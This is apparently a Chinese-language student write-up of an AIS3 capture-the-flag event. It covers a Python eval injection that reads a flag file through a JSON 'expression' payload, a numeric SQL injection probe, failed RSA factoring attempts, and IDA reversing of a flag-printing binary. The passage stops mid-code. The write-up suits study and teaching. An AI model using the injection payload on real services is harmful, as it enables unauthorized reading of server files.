        <content type="html"><![CDATA[<h1 id="Intro">Intro</h1><p>請容我先自我介紹一下！我今年大一，在高中的時候並不是理工背景的學生，相反，我原本是打算去唸法律系的。但是在高三下的時候意外接觸到了 CTF 的資訊，自己稍微摸索了一下，也學了一點程式設計後發現自己對這個領域更為有興趣。可惜當時已經來不及報名學測的自然科目，我就下定決心要到成大不分系，利用他們的選課權利多修習資工系的課程。最終，我如願進到了成大，也在這將近一年的時間裡，修著和資工系一樣的課程，也更加地堅定了自己的選擇是正確的。</p><p>而進到成大後我也並沒有忘記自己當時的初衷，是因為對資安特別感興趣，才誘使我轉換到了這條跑道，所以我也報名了 SCIST 的課程，希望可以在資安領域有更多的成長。嚴格說起來，加上 SCIST 的期末考試，這次是我第二次正式的資安比賽。而這次的我又比上次(SCIST 期末考)花了更多的時間在解題。這次三天的賽程，我幾乎是除了吃飯睡覺以外的時間，都在解題(三點睡覺八點起床 💤)，可惜最後還是一直卡在一些想不出來的點，所以解出來的題目還是有點少。希望在我今年暑假的修煉過後，下次參賽可以有更好的表現！</p><h1 id="Web">Web</h1><h2 id="Evil-Calculator">Evil Calculator</h2><blockquote><p><em>Command Injection</em></p></blockquote><p>先觀察題目，打開 F12 的開發者工具，隨便輸入點東西看看它的運作。這邊我們先在計算機上按下 3+3。</p><p><img src="https://hackmd.io/_uploads/SydoCk94C.png" alt=""></p><p>在圖中我們可以看見，他其實是傳了一個 request 給後端服務器，後端服務器會去執行這個計算，並且把結果回傳給前端。這邊的 payload 長這樣:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3+3&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我們可以發現他就是執行了後面的 3+3。這時候我們再去看題目給的<code>app.py</code>文件，就可以更加地確定我們的想法是對的。如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calculate&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    expression = data[<span class="string">&quot;expression&quot;</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(expression) <span class="comment"># 這裡就是我們要inject的地方！</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> jsonify(result=<span class="built_in">str</span>(result))</span><br></pre></td></tr></table></figure><p>所以我們只要把<code>&#123;expression: &quot;3+3&quot;&#125;</code>中的<code>&quot;3+3&quot;</code>替換成我們要注入的命令就可以被執行了。</p><p>我這邊是用 Chrome 的插件 HackBar 去送請求，本來想要直接<code>cat ../flag</code>，但我發現他的源碼中會把空格給取代掉，像這樣</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression = data[<span class="string">&quot;expression&quot;</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以換了種寫法，payload 如下:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;&#x27;.join([open(&#x27;../flag&#x27;).read()])&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然後我們就得到 flag 了！</p><p><img src="https://hackmd.io/_uploads/S1DlyecE0.png" alt="evil calculator flag"></p><p>(圖片的字可能有點小，flag 我放在下面)</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;7RiANG13_5NAK3_I5_50_3Vi1&#125;</span><br></pre></td></tr></table></figure><p>(我在寫 writeup 的時候才想到，原來題目叫做 evil calculator 是因為作者給了個小提示告訴我們源碼中的 eval 函式有問題 😶)</p><h2 id="Ebook-Parser">Ebook Parser</h2><p>這題我一看到就覺得是文件上傳漏洞(file upload vulnerability)。</p><p><img src="https://hackmd.io/_uploads/HyNVgLoN0.png" alt=""></p><p>但是知道是知道，難就難在我不知道 payload 是甚麼以及該怎麼實作 🥲。所以我嘗試了很多種方法，包括在某個 epub 檔案後面注入一些東西，但都還是失敗了。</p><h2 id="It’s-MyGO">It’s MyGO!!!</h2><p>這個題目給了個網站，上面有很多甚麼 MyGO 的東西(我不知道這啥但我室友一直很開心??)，然後稍微亂點一下之後會發現沒有甚麼東西，就是三個介面:簡介、成員介紹、原創曲。點到原創曲那邊後會發現網址好像有個 SQLi 的機會，如下:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chals1.ais3.org:11454/song?id=2</span><br></pre></td></tr></table></figure><p>嘗試過後發現如果把網址改為</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chals1.ais3.org:11454/song?id=5-3</span><br></pre></td></tr></table></figure><p>一樣可以跳出剛剛 song id=2 的畫面，所以推測應該是數字型 SQLi。至此，我就沒有想法了…。雖然好像應該要寫出來的，但可惜之前一直沒有好好研究 SQL 語法，所以也不太知道漏洞該用怎麼樣的 payload。(然後後來聽大家在群組說好像可以用 SQLmap，好可惜…暑假一定來好好研究 SQLmap 的文檔～)</p><h1 id="Crypto">Crypto</h1><p>密碼學真的是一直以來都覺得很難的東西，全部都是數學要理解起來還真的是有點小吃力，希望之後可以多多加油 😶‍🌫️</p><h2 id="babyRSA">babyRSA</h2><p>這題叫做 babyRSA，但我到最後都還是沒能寫出來 🥲🥲🥲。好的先來看看題目，題目如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keypair</span>(<span class="params">keysize</span>):</span><br><span class="line">    p = getPrime(keysize)</span><br><span class="line">    q = getPrime(keysize)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">    g = gcd(e, phi)</span><br><span class="line">    <span class="keyword">while</span> g != <span class="number">1</span>:</span><br><span class="line">        e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">        g = gcd(e, phi)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">    <span class="keyword">return</span> ((e, n), (d, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pk, plaintext</span>):</span><br><span class="line">    key, n = pk  <span class="comment"># pk =(e, n)</span></span><br><span class="line">    cipher = [<span class="built_in">pow</span>(<span class="built_in">ord</span>(char), key, n) <span class="keyword">for</span> char <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">pk, ciphertext</span>):</span><br><span class="line">    key, n = pk  <span class="comment"># pk = (d, n)</span></span><br><span class="line">    plain = [<span class="built_in">chr</span>(<span class="built_in">pow</span>(char, key, n)) <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public, private = generate_keypair(<span class="number">512</span>)</span><br><span class="line">encrypted_msg = encrypt(public, flag)</span><br><span class="line">decrypted_msg = decrypt(private, encrypted_msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>, public)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted:&quot;</span>, encrypted_msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted:&quot;</span>, decrypted_msg)</span><br></pre></td></tr></table></figure><p>題目看起來就是個正常的 RSA 加密流程:</p><ol><li>先取得兩個大質數<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>相乘後得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p-1)\times(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li><li>再找一個和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>互質的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>，至此，公鑰已經完成</li><li>再用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e^{-1} \bmod \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>算出 d，至此，私鑰也已經找到</li></ol><p>然後接下來我來整理一下我這次嘗試過的各種解法。</p><h3 id="暴力因式分解">暴力因式分解</h3><p>我嘗試使用<a href="http://factordb.com/">FactorDB</a>去分解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，找到需要的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>跟<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，但可惜最後以失敗告終。</p><h3 id="費馬分解-Fermat’s-factorization">費馬分解(Fermat’s factorization)</h3><p>費馬分解是用在當<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>跟<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>相差很小的時候使用的，但因為不知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>所以就還是試試看囉。至於我的腳本就長得像下面這樣:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    a = gmpy2.isqrt(n) + <span class="number">1</span></span><br><span class="line">    b = a**<span class="number">2</span> - n</span><br><span class="line">    <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Round <span class="subst">&#123;<span class="built_in">round</span>&#125;</span>: a = <span class="subst">&#123;a&#125;</span>, b = <span class="subst">&#123;b&#125;</span>&quot;</span>, end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b = a**<span class="number">2</span> - n</span><br><span class="line">    b = gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (a + b, a - b)</span><br></pre></td></tr></table></figure><p>可是我開始運行之後很久都還是沒分解出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>跟<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，可能是因為<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>p</mi><mo>−</mo><mi>q</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|p-q|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">∣</span></span></span></span>其實不小吧。</p><h3 id="Wiener’s-attack">Wiener’s attack</h3><p>這邊我是使用了<a href="https://github.com/pablocelayes/rsa-wiener-attack">這個工具</a>來嘗試破解，不過也是失敗，估計是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>還不夠大，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>還不夠小吧。雖然這題最後沒解出來讓我傷心了很久(因為我賽前還特別去練習了 RSA 的題目結果居然解不出 baby!!!)，但希望這傷心可以轉化為動力，讓我繼續學習！對自己的小期許就是下次甚麼 RSA 一定要寫出來啦啦啦！😠</p><h1 id="Reverse">Reverse</h1><h2 id="The-Long-Print">The Long Print</h2><p>題目給了我們一個二進制文件，然後又是出題在 Reverse 類別，所以就理所當然地把檔案用<a href="https://hex-rays.com/ida-free/">IDA</a>打開來看看吧！</p><p><img src="https://hackmd.io/_uploads/HJprW1oNR.png" alt="IDA打開的樣子"></p><p>點開之後我們就會看到一堆很可怕的東西，所以趕快按下我們的 tab/F5 讓 IDA 幫我們 Decompile 一下。</p><p><img src="https://hackmd.io/_uploads/SkydbyjVR.png" alt="IDA Decompile"></p><p>這樣看起來平易近人多了。那我們就一步一步跟隨著這個程式研究一下他到底如何運作的。為了寫的詳細點我把代碼放上來加點註解解釋一下(寫一起感覺比較清楚)，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you have enough time to receive my flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; i += <span class="number">2</span> ) <span class="comment">// 從i = 0到i &gt; 23，步長為2，共12循環</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// *(_DWORD *)&amp;secret[4 * i]: 從secret的第4 * i個字節開始提取4個字節的整數</span></span><br><span class="line">    <span class="comment">// *(unsigned int *)&amp;secret[4 * i + 4]: 從secret的第4 * i + 4個字節開始提取4個字節的整數</span></span><br><span class="line">    <span class="comment">// 再用上面的那個東西作為索引，從key中提取出相對應的值</span></span><br><span class="line">    <span class="comment">// 把兩個整數做XOR並賦值給v4</span></span><br><span class="line">    v4 = *(_DWORD *)&amp;secret[<span class="number">4</span> * i] ^ key[*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;secret[<span class="number">4</span> * i + <span class="number">4</span>]];</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      sleep(<span class="number">0x3674</span>u); <span class="comment">// 休眠一段時間</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v4); <span class="comment">// 輸出v4的最低位字節作為字符</span></span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>; <span class="comment">// v4向右移8個bits == 一個byte == 一個字節，把剛剛輸出過的字節丟棄</span></span><br><span class="line">      fflush(_bss_start); <span class="comment">// 刷新輸出緩衝區</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\rOops! Where is the flag? I am sure that the flag is already printed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解了這段程式碼後，第一件事當然是去看看這個 secret 跟 key 到底是甚麼東西囉。在 secret 上點兩下，然後點選 hex view 之後，發現了神奇的東西。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">46 41 4B 45 0B 00 00 00  7B 68 6F 6F 0A 00 00 00  FAKE....&#123;hoo....</span><br><span class="line">72 61 79 5F 02 00 00 00  73 74 72 69 08 00 00 00  ray_....stri....</span><br><span class="line">6E 67 73 5F 06 00 00 00  69 73 5F 61 05 00 00 00  ngs_....is_a....</span><br><span class="line">6C 77 61 79 07 00 00 00  73 5F 61 6E 04 00 00 00  lway....s_an....</span><br><span class="line">5F 75 73 65 09 00 00 00  66 75 6C 5F 00 00 00 00  _use....ful_....</span><br><span class="line">63 6F 6D 6D 01 00 00 00  61 6E 7A 7D 03 00 00 00  comm....anz&#125;....</span><br></pre></td></tr></table></figure><p>我當時瞬間以為這就是 flag，提交了之後，想當然，沒那麼簡單 🥹。所以繼續往下看看。這樣看起來剛剛那串東西就是我們需要的 secret 了。再來我們在 key 上面點兩下，就可以發現 key 的值是下面這樣:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rodata:</span><span class="number">0000000000002080</span> key             <span class="built_in">dd</span> <span class="number">3A011001h</span>, <span class="number">4C4C1B0Dh</span>, <span class="number">3A0B002Dh</span>, <span class="number">454F40h</span>, <span class="number">3104321Ah</span></span><br><span class="line"><span class="symbol">.rodata:</span><span class="number">0000000000002080</span>                                         <span class="comment">; DATA XREF: main+6A↑o</span></span><br><span class="line"><span class="symbol">.rodata:</span><span class="number">0000000000002094</span>                 <span class="built_in">dd</span> <span class="number">3E2D161Dh</span>, <span class="number">2C120A31h</span>, <span class="number">0D3E1103h</span>, <span class="number">0C1A002Ch</span>, <span class="number">41D1432h</span></span><br><span class="line"><span 